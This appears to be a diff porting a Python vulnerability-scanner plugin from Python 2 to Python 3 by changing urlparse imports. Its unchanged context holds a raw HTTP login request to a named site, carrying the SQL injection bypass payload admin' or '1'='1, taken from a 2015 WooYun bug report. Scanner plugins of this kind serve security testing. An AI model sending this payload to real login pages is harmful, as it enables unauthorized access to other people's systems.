@@ -5,7 +5,7 @@
 # date:2015-08-10
 # from:http://www.wooyun.org/bugs/wooyun-2015-0110810
 
-import re,urlparse
+import re,urllib.parse
 
 rawt = '''POST /dianyi/index.php?action=login HTTP/1.1
 Host: gxpcjz.com
@@ -27,7 +27,7 @@ name=admin'%20or%20'1'%3D'1&password=5646&submit=%E6%8F%90%E4%BA%A4%E8%A1%A8%E5%
 
 def assign(service, arg):
     if service == "dianyips":
-        arr = urlparse.urlparse(arg)
+        arr = urllib.parse.urlparse(arg)
         return True, '%s://%s/' % (arr.scheme,arr.netloc)
 
 def audit(arg):
